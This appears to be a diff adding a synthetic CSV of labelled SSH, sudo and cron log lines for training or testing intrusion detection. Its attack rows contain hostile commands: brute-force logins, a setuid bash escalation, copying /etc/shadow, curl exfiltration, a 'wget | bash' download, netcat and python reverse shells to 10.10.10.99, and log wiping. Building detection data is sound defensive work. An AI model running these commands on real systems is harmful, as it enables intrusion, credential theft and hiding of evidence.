@@ -1,0 +1,79 @@
+timestamp,src_ip,message,label,attack_type
+2024-04-11T08:00:01Z,192.168.1.10,"Apr 11 08:00:01 server sshd[1001]: Accepted password for alice from 192.168.1.10 port 52341 ssh2",0,NONE
+2024-04-11T08:00:15Z,192.168.1.10,"Apr 11 08:00:15 server sudo: alice : COMMAND=/usr/bin/apt-get update",0,NONE
+2024-04-11T08:00:30Z,192.168.1.10,"Apr 11 08:00:30 server systemd: Started Session 1 of user alice",0,NONE
+2024-04-11T08:00:45Z,192.168.1.20,"Apr 11 08:00:45 server sshd[1002]: Accepted password for bob from 192.168.1.20 port 44210 ssh2",0,NONE
+2024-04-11T08:01:00Z,192.168.1.20,"Apr 11 08:01:00 server sudo: bob : COMMAND=/usr/bin/top",0,NONE
+2024-04-11T08:01:15Z,192.168.1.30,"Apr 11 08:01:15 server sshd[1003]: Accepted password for carol from 192.168.1.30 port 61001 ssh2",0,NONE
+2024-04-11T08:01:30Z,192.168.1.30,"Apr 11 08:01:30 server CRON[1100]: (root) CMD (/usr/bin/backup.sh)",0,NONE
+2024-04-11T08:01:45Z,192.168.1.10,"Apr 11 08:01:45 server sudo: alice : COMMAND=/bin/ls /var/log",0,NONE
+2024-04-11T08:02:00Z,192.168.1.20,"Apr 11 08:02:00 server systemd: Started Session 2 of user bob",0,NONE
+2024-04-11T08:02:15Z,192.168.1.40,"Apr 11 08:02:15 server sshd[1004]: Accepted password for dave from 192.168.1.40 port 55100 ssh2",0,NONE
+2024-04-11T08:03:00Z,10.0.0.5,"Apr 11 08:03:00 server sshd[2001]: Failed password for invalid user admin from 10.0.0.5 port 44001 ssh2",1,Brute Force
+2024-04-11T08:03:05Z,10.0.0.5,"Apr 11 08:03:05 server sshd[2002]: Failed password for invalid user admin from 10.0.0.5 port 44002 ssh2",1,Brute Force
+2024-04-11T08:03:10Z,10.0.0.5,"Apr 11 08:03:10 server sshd[2003]: Failed password for invalid user root from 10.0.0.5 port 44003 ssh2",1,Brute Force
+2024-04-11T08:03:15Z,10.0.0.5,"Apr 11 08:03:15 server sshd[2004]: Failed password for invalid user root from 10.0.0.5 port 44004 ssh2",1,Brute Force
+2024-04-11T08:03:20Z,10.0.0.5,"Apr 11 08:03:20 server sshd[2005]: Failed password for invalid user ubuntu from 10.0.0.5 port 44005 ssh2",1,Brute Force
+2024-04-11T08:03:25Z,10.0.0.5,"Apr 11 08:03:25 server sshd[2006]: Failed password for invalid user ubuntu from 10.0.0.5 port 44006 ssh2",1,Brute Force
+2024-04-11T08:03:30Z,10.0.0.5,"Apr 11 08:03:30 server sshd[2007]: Failed password for invalid user deploy from 10.0.0.5 port 44007 ssh2",1,Brute Force
+2024-04-11T08:03:35Z,10.0.0.5,"Apr 11 08:03:35 server sshd[2008]: Failed password for invalid user deploy from 10.0.0.5 port 44008 ssh2",1,Brute Force
+2024-04-11T08:03:40Z,10.0.0.5,"Apr 11 08:03:40 server sshd[2009]: Accepted password for www-data from 10.0.0.5 port 44009 ssh2",1,Brute Force
+2024-04-11T08:03:45Z,10.0.0.5,"Apr 11 08:03:45 server sshd[2010]: session opened for user www-data by (uid=33)",1,Brute Force
+2024-04-11T08:04:00Z,192.168.1.10,"Apr 11 08:04:00 server sshd[1010]: Accepted password for alice from 192.168.1.10 port 52400 ssh2",0,NONE
+2024-04-11T08:04:10Z,192.168.1.20,"Apr 11 08:04:10 server sudo: bob : COMMAND=/usr/bin/df -h",0,NONE
+2024-04-11T08:04:20Z,192.168.1.30,"Apr 11 08:04:20 server CRON[1200]: (alice) CMD (/home/alice/scripts/cleanup.sh)",0,NONE
+2024-04-11T08:04:30Z,192.168.1.40,"Apr 11 08:04:30 server systemd: Started Session 3 of user dave",0,NONE
+2024-04-11T08:04:45Z,192.168.1.10,"Apr 11 08:04:45 server sudo: alice : COMMAND=/usr/bin/systemctl status nginx",0,NONE
+2024-04-11T08:05:00Z,10.0.0.5,"Apr 11 08:05:00 server sudo: www-data : command not allowed ; TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash",1,Privilege Escalation
+2024-04-11T08:05:05Z,10.0.0.5,"Apr 11 08:05:05 server su: FAILED su for root by www-data",1,Privilege Escalation
+2024-04-11T08:05:10Z,10.0.0.5,"Apr 11 08:05:10 server sudo: www-data : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c import pty;pty.spawn('/bin/bash')",1,Privilege Escalation
+2024-04-11T08:05:15Z,10.0.0.5,"Apr 11 08:05:15 server kernel: [12345.678] audit: type=1400 audit(1234567890.123:45): apparmor=ALLOWED operation=exec profile=unconfined name=/usr/bin/python3",1,Privilege Escalation
+2024-04-11T08:05:20Z,10.0.0.5,"Apr 11 08:05:20 server sudo: www-data : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod u+s /bin/bash",1,Privilege Escalation
+2024-04-11T08:05:25Z,10.0.0.5,"Apr 11 08:05:25 server sshd[2020]: Accepted password for root from 10.0.0.5 port 44020 ssh2",1,Privilege Escalation
+2024-04-11T08:05:30Z,10.0.0.5,"Apr 11 08:05:30 server sudo: root : TTY=pts/2 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/id",1,Privilege Escalation
+2024-04-11T08:06:00Z,192.168.1.20,"Apr 11 08:06:00 server sshd[1020]: Accepted password for bob from 192.168.1.20 port 44300 ssh2",0,NONE
+2024-04-11T08:06:10Z,192.168.1.30,"Apr 11 08:06:10 server sudo: carol : COMMAND=/usr/bin/passwd",0,NONE
+2024-04-11T08:06:20Z,192.168.1.40,"Apr 11 08:06:20 server CRON[1300]: (root) CMD (/usr/sbin/logrotate /etc/logrotate.conf)",0,NONE
+2024-04-11T08:06:30Z,192.168.1.10,"Apr 11 08:06:30 server systemd: Stopping User Manager for UID 1000",0,NONE
+2024-04-11T08:06:45Z,192.168.1.20,"Apr 11 08:06:45 server sudo: bob : COMMAND=/usr/bin/journalctl -n 50",0,NONE
+2024-04-11T08:07:00Z,10.0.0.5,"Apr 11 08:07:00 server sshd[2030]: Accepted password for root from 10.0.0.5 port 44030 ssh2",1,Lateral Movement
+2024-04-11T08:07:05Z,10.0.0.5,"Apr 11 08:07:05 server sshd[2031]: Accepted password for root from 10.0.0.5 port 44031 ssh2",1,Lateral Movement
+2024-04-11T08:07:10Z,10.0.0.5,"Apr 11 08:07:10 server sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/ssh -i /root/.ssh/id_rsa root@192.168.1.50",1,Lateral Movement
+2024-04-11T08:07:15Z,10.0.0.5,"Apr 11 08:07:15 server sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /etc/shadow root@192.168.1.50:/tmp/",1,Lateral Movement
+2024-04-11T08:07:20Z,10.0.0.5,"Apr 11 08:07:20 server sshd[2035]: Accepted password for root from 192.168.1.50 port 55200 ssh2",1,Lateral Movement
+2024-04-11T08:07:25Z,10.0.0.5,"Apr 11 08:07:25 server sudo: root : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/nmap -sn 192.168.1.0/24",1,Lateral Movement
+2024-04-11T08:07:30Z,10.0.0.5,"Apr 11 08:07:30 server sudo: root : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ssh root@192.168.1.60",1,Lateral Movement
+2024-04-11T08:07:35Z,10.0.0.5,"Apr 11 08:07:35 server sudo: root : TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ssh root@192.168.1.70",1,Lateral Movement
+2024-04-11T08:08:00Z,192.168.1.30,"Apr 11 08:08:00 server sshd[1030]: Accepted password for carol from 192.168.1.30 port 61100 ssh2",0,NONE
+2024-04-11T08:08:10Z,192.168.1.10,"Apr 11 08:08:10 server sudo: alice : COMMAND=/usr/bin/find /var/log -name '*.log'",0,NONE
+2024-04-11T08:08:20Z,192.168.1.20,"Apr 11 08:08:20 server CRON[1400]: (bob) CMD (/home/bob/bin/sync.sh)",0,NONE
+2024-04-11T08:08:30Z,192.168.1.40,"Apr 11 08:08:30 server systemd: Started Session 4 of user dave",0,NONE
+2024-04-11T08:08:45Z,192.168.1.30,"Apr 11 08:08:45 server sudo: carol : COMMAND=/usr/bin/cat /etc/hosts",0,NONE
+2024-04-11T08:09:00Z,10.0.0.5,"Apr 11 08:09:00 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/data.tar.gz /home /etc/passwd /etc/shadow",1,Exfiltration
+2024-04-11T08:09:05Z,10.0.0.5,"Apr 11 08:09:05 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -F file=@/tmp/data.tar.gz http://10.10.10.99/upload",1,Exfiltration
+2024-04-11T08:09:10Z,10.0.0.5,"Apr 11 08:09:10 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget -q -O - http://10.10.10.99/c2 | bash",1,Exfiltration
+2024-04-11T08:09:15Z,10.0.0.5,"Apr 11 08:09:15 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -e /bin/bash 10.10.10.99 4444",1,Exfiltration
+2024-04-11T08:09:20Z,10.0.0.5,"Apr 11 08:09:20 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/python3 -c import socket,subprocess,os;s=socket.socket();s.connect((10.10.10.99,4445))",1,Exfiltration
+2024-04-11T08:09:25Z,10.0.0.5,"Apr 11 08:09:25 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/echo '' > /var/log/auth.log",1,Exfiltration
+2024-04-11T08:09:30Z,10.0.0.5,"Apr 11 08:09:30 server sudo: root : TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/bin/echo '' > /var/log/syslog",1,Exfiltration
+2024-04-11T08:09:35Z,10.0.0.5,"Apr 11 08:09:35 server CRON[3001]: (root) CMD (curl -s http://10.10.10.99/beacon > /dev/null)",1,Exfiltration
+2024-04-11T08:10:00Z,192.168.1.10,"Apr 11 08:10:00 server sshd[1040]: Accepted password for alice from 192.168.1.10 port 52500 ssh2",0,NONE
+2024-04-11T08:10:10Z,192.168.1.20,"Apr 11 08:10:10 server sudo: bob : COMMAND=/usr/bin/uptime",0,NONE
+2024-04-11T08:10:20Z,192.168.1.30,"Apr 11 08:10:20 server systemd: Started Session 5 of user carol",0,NONE
+2024-04-11T08:10:30Z,192.168.1.40,"Apr 11 08:10:30 server sudo: dave : COMMAND=/usr/bin/free -m",0,NONE
+2024-04-11T08:10:45Z,192.168.1.10,"Apr 11 08:10:45 server CRON[1500]: (alice) CMD (/home/alice/scripts/report.sh)",0,NONE
+2024-04-11T08:11:00Z,192.168.1.20,"Apr 11 08:11:00 server sshd[1050]: Accepted password for bob from 192.168.1.20 port 44400 ssh2",0,NONE
+2024-04-11T08:11:10Z,192.168.1.30,"Apr 11 08:11:10 server sudo: carol : COMMAND=/usr/bin/ping -c 4 8.8.8.8",0,NONE
+2024-04-11T08:11:20Z,192.168.1.40,"Apr 11 08:11:20 server systemd: Stopping User Manager for UID 1003",0,NONE
+2024-04-11T08:11:30Z,192.168.1.10,"Apr 11 08:11:30 server sudo: alice : COMMAND=/usr/bin/grep -r error /var/log/nginx",0,NONE
+2024-04-11T08:11:45Z,192.168.1.20,"Apr 11 08:11:45 server CRON[1600]: (root) CMD (/usr/bin/certbot renew)",0,NONE
+2024-04-11T08:12:00Z,192.168.1.30,"Apr 11 08:12:00 server sshd[1060]: Accepted password for carol from 192.168.1.30 port 61200 ssh2",0,NONE
+2024-04-11T08:12:10Z,192.168.1.40,"Apr 11 08:12:10 server sudo: dave : COMMAND=/usr/bin/netstat -tulpn",0,NONE
+2024-04-11T08:12:20Z,192.168.1.10,"Apr 11 08:12:20 server systemd: Started Session 6 of user alice",0,NONE
+2024-04-11T08:12:30Z,192.168.1.20,"Apr 11 08:12:30 server sudo: bob : COMMAND=/usr/bin/tail -f /var/log/syslog",0,NONE
+2024-04-11T08:12:45Z,192.168.1.30,"Apr 11 08:12:45 server CRON[1700]: (carol) CMD (/home/carol/bin/health_check.sh)",0,NONE
+2024-04-11T08:13:00Z,192.168.1.40,"Apr 11 08:13:00 server sshd[1070]: Accepted password for dave from 192.168.1.40 port 55300 ssh2",0,NONE
+2024-04-11T08:13:10Z,192.168.1.10,"Apr 11 08:13:10 server sudo: alice : COMMAND=/usr/bin/systemctl restart apache2",0,NONE
+2024-04-11T08:13:20Z,192.168.1.20,"Apr 11 08:13:20 server systemd: Started Session 7 of user bob",0,NONE
+2024-04-11T08:13:30Z,192.168.1.30,"Apr 11 08:13:30 server sudo: carol : COMMAND=/usr/bin/du -sh /var/log",0,NONE
+2024-04-11T08:13:45Z,192.168.1.40,"Apr 11 08:13:45 server CRON[1800]: (root) CMD (/usr/bin/updatedb)",0,NONE
